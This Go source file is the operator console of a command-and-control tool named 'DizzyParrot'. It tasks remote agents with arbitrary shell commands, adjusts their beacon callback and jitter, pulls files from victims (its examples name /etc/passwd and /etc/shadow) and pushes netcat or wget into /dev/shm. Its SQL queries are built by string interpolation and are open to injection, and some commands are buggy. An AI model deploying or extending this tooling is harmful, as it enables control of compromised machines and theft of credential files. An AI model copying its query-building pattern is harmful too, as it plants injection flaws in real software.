package main

import (
	"database/sql"
	b64 "encoding/base64"
	"flag"
	"fmt"
	"github.com/c-bata/go-prompt"
	"github.com/common-nighthawk/go-figure"
	"github.com/jedib0t/go-pretty/table"
	_ "github.com/lib/pq"
	"gopkg.in/yaml.v2"
	"log"
	"os"
	"strconv"
	"strings"
	"time"
)

// Human readable date format
const human string = "2006-01-02 15:04:05"

// Database connection
var db *sql.DB

// Configuration file
var cfg Config

// Configuration file struct
type Config struct {
	Database struct {
		Dbhost string 	`yaml:"host"`
		Dbport int	`yaml:"port"`
		Dbuser string 	`yaml:"user"`
		Dbpass string 	`yaml:"pass"`
		Dbname string 	`yaml:"name"`
		Dbmode string 	`yaml:"mode"`
	} `yaml:"database"`
}

// Active agent holder
var active = ""

var LivePrefixState struct {
	livePrefix string
	isEnable   bool
}

// Agent task object
type AgentIdentity struct {
	Id 		int 	`db:"id"`
	Name 		string 	`db:"name"`
	Architecture 	string 	`db:"architecture"`
	Os 		string 	`db:"os"`
	Secret          string  `db:"secret"`
	Callback        string  `db:"callback"`
	Jitter          string 	`db:"jitter"`
	FirstSeen 	int64 	`db:"firstSeen"`
	LastSeen 	int64 	`db:"lastSeen"`
}

// Agent task object
type AgentTask struct {
	Id 		int 	`db:"id"`
	Name 		string 	`db:"name"`
	Command 	string 	`db:"command"`
	Job             int     `db:"job"`
	Status 		string 	`db:"status"`
	TaskDate 	int64 	`db:"taskDate"`
	CompleteDate 	int64 	`db:"completeDate"`
	Complete 	bool 	`db:"complete"`
}

// Agent struct for posting results
type Result struct {
	Name   	string `json:"name"`
	JobId  	int    `json:"jobId"`
	Output 	string `json:"output"`
}

func main() {

	// Required: server and database configuration file
	var config = flag.String("c", "config.yml", "Configuration file")
	flag.Parse()

	initShell(*config)

	myFigure := figure.NewFigure("DizzyParrot", "block", true)
	myFigure.Print()
	fmt.Println("         \\\\")
	fmt.Println("  \\\\     (o>")
	fmt.Println("  (o>     //\\")
	fmt.Println("__(()_____V_/_____")
	fmt.Println("  ||      ||")
	fmt.Println("          ||")

	fmt.Println("\n[+] Starting shell...")

	p := prompt.New(
		executor,
		completer,
		prompt.OptionPrefix(">>> "),
		prompt.OptionLivePrefix(changeLivePrefix),
		prompt.OptionTitle("DizzyParrot"),
	)
	p.Run()
}

// Error function
func processError(err error) {
	fmt.Println(err)
	os.Exit(2)
}

// Initialize the shell, read variables from yaml and connect to db
func initShell(c string) {
	// Read server configuration
	f, err := os.Open(c)
	if err != nil {
		fmt.Println("[!] Missing configuration file.")
		os.Exit(3)
	}
	defer f.Close()

	decoder := yaml.NewDecoder(f)
	err = decoder.Decode(&cfg)
	if err != nil {
		fmt.Println("[!] Error reading configuration file.")
		os.Exit(3)
	}

	// Connect to database
	connect()
}

func getEpochTime() int64 {
	return time.Now().Unix()
}

func changeLivePrefix() (string, bool) {
	return LivePrefixState.livePrefix, LivePrefixState.isEnable
}

func checkLiveAndActive() bool {
	if LivePrefixState.isEnable && active != "" {
		return true
	} else {
		return false
	}
}

func taskAgentWithJob(c string) AgentTask {
	task := AgentTask{
		Name:         active,
		Command:      c,
		Status:       "Staged",
		TaskDate:     getEpochTime(),
		CompleteDate: 0,
		Complete:     false,
	}
	return task
}

func executor(in string) {
	c := strings.Split(in, " ")

	if len(c) < 1 {
		fmt.Println("[!] Missing command")
		return
	}

	cmd := strings.TrimSpace(c[0])

	switch cmd {
	case "staged":
		if checkLiveAndActive() && len(c) == 1 {
			ShowStagedJobs(active)
		} else {
			fmt.Println("[!] Invalid command. Must be tagged into an agent. Takes 0 arguments.")
		}
	case "quit":
		os.Exit(0)
	case "agent":
		if len(c) == 1 {
			LivePrefixState.isEnable = false
			LivePrefixState.livePrefix = in
			active = ""

			ShowAgents()
		} else if len(c) == 2 {
			e := CheckAgentExists(strings.TrimSpace(c[1]))
			if e {
				LivePrefixState.livePrefix = strings.TrimSpace(c[1]) + "> "
				LivePrefixState.isEnable = true
				active = c[1]
			} else {
				fmt.Println("[!] Agent not found")
			}
		} else {
			fmt.Println("[!] Invalid command. ")
		}
	case "agents":
		if len(c) == 1 {
			ShowAgents()
		} else {
			fmt.Println("[!] Invalid command. Takes 0 arguments.")
		}
	case "kill":
		if checkLiveAndActive() && len(c) == 1 {
			task := taskAgentWithJob(strings.TrimSpace(c[1]))
			AddAgentTask(task)
		} else {
			fmt.Println("[!] Invalid command. Must be tagged into an agent. Takes 0 arguments.")
		}
	case "task":
		if checkLiveAndActive() && len(c) > 2 {
			task := taskAgentWithJob(strings.Join(c[1:], " "))
			AddAgentTask(task)
		} else {
			fmt.Println("[!] Invalid command. Must be tagged into an agent. Takes shell + shell command")
			fmt.Println("Example: task /bin/bash ls -la || task /bin/sh ps -efH")
		}
	case "info":
		if checkLiveAndActive() && len(c) == 1 {
			ShowAgentInfo(active)
		} else {
			fmt.Println("[!] Invalid command. Must be tagged into an agent. Takes 0 arguments.")
		}
	case "jobs":
		if checkLiveAndActive() && len(c) == 1 {
			ShowAgentJobs(active)
		} else {
			fmt.Println("[!] Invalid command. Must be tagged into an agent. Takes 0 arguments.")
		}
	case "job":
		if checkLiveAndActive() && len(c) == 2 {
			x, err := strconv.Atoi(c[1])
			if err != nil {
				fmt.Println("[!] Invalid job id")
				return
			}
			e := CheckJobExists(x, active)
			if e {
				ShowJobResult(x, active)
			} else {
				fmt.Println("[!] Job not found for agent")
			}
		} else {
			fmt.Println("[!] Invalid command. Must be tagged into an agent. Takes job + id")
			fmt.Println("Example: job 2 || job 10")
		}
	case "forget":
		if !checkLiveAndActive() && len(c) == 3 && strings.TrimSpace(c[1]) == "agent" {
			e := CheckAgentExists(strings.TrimSpace(c[2]))
			if e {
				forgetAgent(active)
			} else {
				fmt.Println("[!] Agent not found")
			}
		} else {
			fmt.Println("[!] Invalid command. Must not be tagged into an agent. Takes agent keyword + agent name")
			fmt.Println("Example: forget agent A10000 || forget agent A10002")
		}
	case "set":
		if checkLiveAndActive() && len(c) == 3 && (strings.TrimSpace(c[1]) == "callback" || strings.TrimSpace(c[1]) == "jitter") {
			x, err := strconv.Atoi(c[2])
			if err != nil {
				fmt.Println("[!} Invalid interval")
				return
			}
			task := taskAgentWithJob(strings.Join(c[:], " "))
			AddAgentTask(task)

			if strings.TrimSpace(c[1]) == "callback" {
				SetCallback(active, x)
			} else {
				SetJitter(active, x)
			}
		} else {
			fmt.Println("[!] Invalid command. Must not be tagged into an agent. Takes type keyword + interval in (s)")
			fmt.Println("Example: set callback 300 || set jitter 60")
		}
	case "flush":
		if checkLiveAndActive() && len(c) == 1 {
			FlushJobs(active)
		} else {
			fmt.Println("[!] Invalid command. Must be tagged into an agent. Takes 0 arguments.")
		}
	case "revoke":
		if checkLiveAndActive() && len(c) == 1 {
			RevokeJobs(active)
		} else if len(c) == 2 && strings.TrimSpace(c[1]) == "restage"{
			RevokeRestageJobs(active)
		} else {
			fmt.Println("[!] Invalid command. Must be tagged into an agent. Takes 0 arguments or keyword restage.")
			fmt.Println("Example: revoke || revoke restage")
		}
	case "deploy":
		if checkLiveAndActive() && len(c) == 1 {
			DeployAgentJobs(active)
		} else {
			fmt.Println("[!] Invalid command. Must be tagged into an agent. Takes 0 arguments.")
		}
	case "pull":
		if checkLiveAndActive() && len(c) == 2 {
			task := taskAgentWithJob(strings.Join(c[:], " "))
			AddAgentTask(task)
		} else {
			fmt.Println("[!] Invalid command. Must be tagged into an agent. Takes remote file to pull.")
			fmt.Println("Example: pull /etc/passwd || pull /etc/shadow")
		}
	case "push":
		if checkLiveAndActive() && len(c) == 3 {
			f := checkFile(c[1])
			if !f {
				fmt.Println("[!] Could not find file to push!")
				return
			}
			task := taskAgentWithJob(strings.Join(c[:], " "))
			AddAgentTask(task)
		} else {
			fmt.Println("[!] Invalid command. Must be tagged into an agent. Takes local file + remote file.")
			fmt.Println("Example: push /tmp/nc /dev/shm/nc || push /tmp/wget /dev/shm/wget")
		}
	}
}

func completer(d prompt.Document) []prompt.Suggest {
	s := []prompt.Suggest{
		{Text: "agent", Description: "Tag into an agent"},
		{Text: "agents", Description: "List available agents"},
		{Text: "job", Description: "Show output from an agent job"},
		{Text: "jobs", Description: "Show jobs for an agent"},
		{Text: "info", Description: "Show agent info"},
		{Text: "task", Description: "Task an agent"},
		{Text: "forget job", Description: "Remove a job from tasked jobs"},
		{Text: "forget agent", Description: "Remove an agent"},
		{Text: "deploy", Description: "Deploy tasks to agent"},
		{Text: "flush", Description: "Flush non-deployed tasks"},
		{Text: "revoke", Description: "Revoke a deployed task"},
		{Text: "revoke restage", Description: "Revoke a deployed task"},
		{Text: "set callback", Description: "Revoke a deployed task"},
		{Text: "set jitter", Description: "Revoke a deployed task"},
		{Text: "staged", Description: "Display staged tasks for an agent"},
		{Text: "kill", Description: "Terminate the agent process"},
		{Text: "quit", Description: "Exit the shell"},
	}
	return prompt.FilterHasPrefix(s, d.GetWordBeforeCursor(), true)
}

func b64Decode(s string) string {
	x,_ := b64.StdEncoding.DecodeString(s)
	return string(x)
}

func b64Encode(s string) string {
	return b64.StdEncoding.EncodeToString([]byte(s))
}

func checkFile(s string) bool {
	if _, err := os.Stat(s); os.IsNotExist(err) {
		return false
	} else {
		return true
	}
}

// Connect to postgres database
func connect() {
	connectionString := fmt.Sprintf("host=%s port=%d user=%s password=%s dbname=%s sslmode=%s",
		cfg.Database.Dbhost, cfg.Database.Dbport, cfg.Database.Dbuser, cfg.Database.Dbpass, cfg.Database.Dbname,
		cfg.Database.Dbmode)

	var err error
	db, err = sql.Open("postgres", connectionString)
	if err != nil {
		processError(err)
	}

	err = db.Ping()
	if err != nil {
		processError(err)
	}
}

// Exec Postgres database command
func exec(command string) {
	_, err := db.Exec(command)
	if err != nil {
		log.Fatal(err)
	}
}

// Add task to Postgres
func AddAgentTask(a AgentTask) {
	t := "INSERT INTO tasks (name, command, status, taskDate, completeDate, complete) VALUES ('%s', '%s', '%s', %d, %d, %t);"
	command := fmt.Sprintf(t, a.Name, a.Command, a.Status, a.TaskDate, a.CompleteDate, a.Complete)
	exec(command)
}

// Show available agents
func ShowAgents() {
	t := "SELECT * FROM agents ORDER BY lastSeen DESC;"
	command := fmt.Sprintf(t)
	rows, err := db.Query(command)
	if err != nil {
		log.Fatal(err)
	}
	defer rows.Close()

	x := table.NewWriter()
	x.SetOutputMirror(os.Stdout)
	x.AppendHeader(table.Row{"Id", "Agent", "Architecture", "OS", "Secret", "Callback", "Jitter", "First Seen", "Last Seen"})

	for rows.Next() {
		var a AgentIdentity
		err = rows.Scan(&a.Id, &a.Name, &a.Architecture, &a.Os, &a.Secret, &a.Callback, &a.Jitter, &a.FirstSeen, &a.LastSeen)

		if err != nil {
			log.Fatal(err)
		}
		x.AppendRow([]interface{}{a.Id, a.Name, a.Architecture, a.Os, a.Secret, a.Callback, a.Jitter,
			convertFromEpoch(a.FirstSeen), convertFromEpoch(a.LastSeen)})
	}
	x.Render()
}

func convertFromEpoch(i int64) string {
	t := time.Unix(i, 0)
	return t.Format(human)
}

// Show available agents
func ShowAgentInfo(n string) {
	t := "SELECT id,name,architecture,os,secret,callback,jitter,firstSeen,lastSeen FROM agents WHERE name='%s' LIMIT 1;"
	command := fmt.Sprintf(t, n)
	rows, err := db.Query(command)
	if err != nil {
		log.Fatal(err)
	}
	defer rows.Close()

	for rows.Next() {
		var a AgentIdentity
		err = rows.Scan(&a.Id, &a.Name, &a.Architecture, &a.Os, &a.Secret, &a.Callback, &a.Jitter, &a.FirstSeen, &a.LastSeen)

		if err != nil {
			log.Fatal(err)
		}
		x := table.NewWriter()
		x.SetOutputMirror(os.Stdout)
		x.AppendHeader(table.Row{"Id", "Agent", "Architecture", "OS", "Secret", "Callback", "Jitter", "First Seen", "Last Seen"})
		x.AppendRow([]interface{}{a.Id, a.Name, a.Architecture, a.Os, a.Secret, a.Callback, a.Jitter,
			convertFromEpoch(a.FirstSeen), convertFromEpoch(a.LastSeen)})
		x.Render()
	}
}

// Show available agents
func ShowAgentJobs(n string) {
	t := "SELECT job, name, command, status, taskDate, completeDate, complete FROM tasks WHERE name='%s' AND (status='Deployed' OR status='Complete') ORDER BY job DESC LIMIT 10;"
	fmt.Println(n)
	command := fmt.Sprintf(t, n)
	rows, err := db.Query(command)
	if err != nil {
		log.Fatal(err)
	}
	defer rows.Close()

	x := table.NewWriter()
	x.SetOutputMirror(os.Stdout)
	x.AppendHeader(table.Row{"Id", "Agent", "Command", "Status", "Task Date", "Complete Date", "Complete"})
	for rows.Next() {
		var a AgentTask
		err = rows.Scan(&a.Job, &a.Name, &a.Command, &a.Status, &a.TaskDate, &a.CompleteDate, &a.Complete)

		if err != nil {
			log.Fatal(err)
		}

		x.AppendRow([]interface{}{a.Job, a.Name, a.Command, a.Status, convertFromEpoch(a.TaskDate),
			convertFromEpoch(a.CompleteDate), a.Complete})
	}
	x.Render()
}

func ShowJobResult(j int, n string) {
	q := "SELECT output FROM results WHERE name='%s' AND jobId=%d"
	command := fmt.Sprintf(q, n, j)
	row := db.QueryRow(command)

	var r Result
	switch err := row.Scan(&r.Output); err  {
	case sql.ErrNoRows:
		fmt.Println("[ERROR] Job results not found")
	case nil:
		fmt.Println("[+] Job Results:\n", b64Decode(strings.TrimSpace(r.Output)))
	default:
		fmt.Println("[ERROR] Job results not found")
	}

}

func CheckAgentExists(n string) bool {
	q := "SELECT exists (SELECT 1 from agents WHERE name='%s' LIMIT 1)"
	command := fmt.Sprintf(q, n)
	row := db.QueryRow(command)

	var exists bool
	err := row.Scan(&exists)
	if err != nil {
		return false
	} else {
		return exists
	}
}

func CheckJobExists(i int, n string) bool {
	q := "SELECT exists (SELECT 1 from tasks WHERE name='%s' AND job=%d LIMIT 1)"
	command := fmt.Sprintf(q, n, i)
	row := db.QueryRow(command)

	var exists bool
	err := row.Scan(&exists)
	if err != nil {
		return false
	} else {
		return exists
	}
}

func RemoveJob(i int, n string) {
	q := "DELETE FROM tasks WHERE name='%s' AND job=%d LIMIT 1"
	command := fmt.Sprintf(q, n, i)
	exec(command)
}

func forgetAgent(n string) {
	a := []string{"tasks", "agents", "tokens", "results"}
	for _, s := range a {
    		d := "DELETE FROM '%s' WHERE name='%s'"
		command := fmt.Sprintf(d, s, n)
		exec(command)
	}
}

// Show available agents
func ShowStagedJobs(n string) {
	t := "SELECT name, job, command, status, taskDate, completeDate, complete FROM tasks WHERE name='%s' AND status='Staged' ORDER BY taskDate DESC LIMIT 10;"
	command := fmt.Sprintf(t, n)
	rows, err := db.Query(command)
	if err != nil {
		log.Fatal(err)
	}
	defer rows.Close()

	x := table.NewWriter()
	x.SetOutputMirror(os.Stdout)
	x.AppendHeader(table.Row{"Id", "Agent", "Command", "Status", "Task Date", "Complete Date", "Complete"})
	for rows.Next() {
		var a AgentTask
		err = rows.Scan(&a.Name, &a.Job, &a.Command, &a.Status, &a.TaskDate, &a.CompleteDate, &a.Complete)

		if err != nil {
			log.Fatal(err)
		}

		x.AppendRow([]interface{}{a.Job, a.Name, a.Command, a.Status, convertFromEpoch(a.TaskDate),
			convertFromEpoch(a.CompleteDate), a.Complete})
	}
	x.Render()
}

func SetCallback(n string, i int) {
	u := "UPDATE agents SET callback = %d WHERE name = '%s'"
	c := fmt.Sprintf(u, i, n)
	exec(c)
}

func SetJitter(n string, i int) {
	u := "UPDATE agents SET jitter = %d WHERE name = '%s'"
	c := fmt.Sprintf(u, i, n)
	exec(c)
}

func RevokeJobs(n string) {
	u := "DELETE FROM tasks WHERE name='%s' AND status='Deployed'"
	c := fmt.Sprintf(u, n)
	exec(c)
}

func RevokeRestageJobs(n string) {
	u := "UPDATE tasks SET status = 'Staged' WHERE name='%s' AND status='Deployed'"
	c := fmt.Sprintf(u, n)
	exec(c)
}

func DeployAgentJobs(n string) {
	u := "UPDATE tasks SET status = 'Deployed' WHERE name='%s' AND status='Staged'"
	c := fmt.Sprintf(u, n)
	exec(c)
}

func FlushJobs(n string) {
	u := "DELETE FROM tasks WHERE name='%s' AND status='Staged'"
	c := fmt.Sprintf(u, n)
	exec(c)
}

func DumpAgent(n string) {
	// TODO: Query all and write to outfile
}
